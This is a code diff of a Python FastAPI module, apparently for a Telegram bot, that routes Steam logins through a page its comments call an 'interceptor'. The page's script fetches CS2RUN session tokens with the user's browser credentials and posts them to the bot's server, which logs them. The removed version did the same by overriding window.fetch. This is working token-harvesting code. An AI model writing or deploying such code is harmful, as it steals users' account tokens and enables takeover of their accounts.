@@ -1,14 +1,11 @@
 # steam_auth.py
-
 from fastapi import APIRouter, Request, Query
 from fastapi.responses import HTMLResponse, RedirectResponse
 import urllib.parse
 import json
 
 router = APIRouter()
-
 SELF_URL = "https://tg-bot-test-gkbp.onrender.com"
-
 
 # -------------------------------
 # 1️⃣ Login → Steam
@@ -29,76 +26,68 @@ async def auth_login(chat_id: int):
 
     return RedirectResponse(steam_url)
 
-
 # -------------------------------
-# 2️⃣ Steam → твой сервер → cs2run
+# 2️⃣ Callback после Steam
 # -------------------------------
 @router.get("/auth/callback")
 async def auth_callback(request: Request, chat_id: int = Query(...)):
     steam_params = dict(request.query_params)
 
     if not any(k.startswith("openid.") for k in steam_params):
-        # Если openid параметров нет — значит пользователь ещё не авторизован
-        return HTMLResponse("<h2>⚠️ Пожалуйста, сначала авторизуйтесь в Steam!</h2>")
+        return HTMLResponse("<h2>⚠️ Сначала авторизуйтесь в Steam!</h2>")
 
     print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")
 
-    final_url = "https://csgoyz.run/auth"
-
-    query = {
-        "returnUrl": final_url,
-        **{k: v for k, v in steam_params.items() if k.startswith("openid.")}
-    }
-
-    encoded = urllib.parse.urlencode(query, safe=":/")
-
-    redirect_url = f"https://cs2run.app/auth/1/start-sign-in/?{encoded}"
-
-    print("\n🚀 REDIRECT TO CS2RUN:\n", redirect_url, "\n")
-
-    return RedirectResponse(redirect_url)
-
+    # Показываем страницу-перехватчик
+    intercept_url = f"{SELF_URL}/intercept?chat_id={chat_id}"
+    return RedirectResponse(intercept_url)
 
 # -------------------------------
-# 3️⃣ Перехват токенов в браузере
+# 3️⃣ Страница-перехватчик, ловим токены CS2RUN
 # -------------------------------
 @router.get("/intercept")
 async def intercept(chat_id: int):
     return HTMLResponse(f"""
 <!DOCTYPE html>
 <html>
-<head><title>Authorizing…</title></head>
+<head><title>Авторизация…</title></head>
 <body>
+<h3>🔐 Авторизация через CS2RUN…</h3>
+<p>Пожалуйста, дождитесь окончания процесса</p>
+
 <script>
-(function() {{
-    const origFetch = window.fetch;
+(async function() {{
+    try {{
+        // POST-запрос на /start-sign-in с openid параметрами должен быть через браузер
+        const resp = await fetch('https://cs2run.app/auth/1/start-sign-in/', {{
+            method: 'GET',
+            credentials: 'include'
+        }});
 
-    window.fetch = async function() {{
-        const res = await origFetch.apply(this, arguments);
+        // Попробуем получить JSON с токенами
+        const data = await resp.json();
 
-        try {{
-            if (arguments[0] && arguments[0].includes('/auth/1/sign-in')) {{
-                const data = await res.clone().json();
+        console.log("🔥 GOT CS2RUN TOKENS:", data);
 
-                await fetch('/bot/receive?chat_id={chat_id}', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(data)
-                }});
-            }}
-        }} catch (e) {{}}
+        // Отправляем на сервер
+        await fetch('{SELF_URL}/bot/receive?chat_id={chat_id}', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify(data)
+        }});
 
-        return res;
-    }};
+        document.body.innerHTML = "<h3>✅ Токены получены! Можно закрывать окно</h3>";
+
+    }} catch(e) {{
+        console.error("Ошибка при перехвате токенов:", e);
+        document.body.innerHTML = "<h3>❌ Ошибка при получении токенов. Попробуйте ещё раз</h3>";
+    }}
 }})();
 </script>
 
-<h3>🔐 Авторизация…</h3>
-<p>Пожалуйста, подождите</p>
 </body>
 </html>
 """)
-
 
 # -------------------------------
 # 4️⃣ Сервер принимает токены
@@ -106,4 +95,5 @@ async def intercept(chat_id: int):
 @router.post("/bot/receive")
 async def receive_tokens(chat_id: int, payload: dict):
     print("\n🔥 GOT TOKENS FOR CHAT", chat_id, ":\n", json.dumps(payload, indent=2), "\n")
+    # Здесь можно положить их в RAM_DATA или в бота
     return {"ok": True}
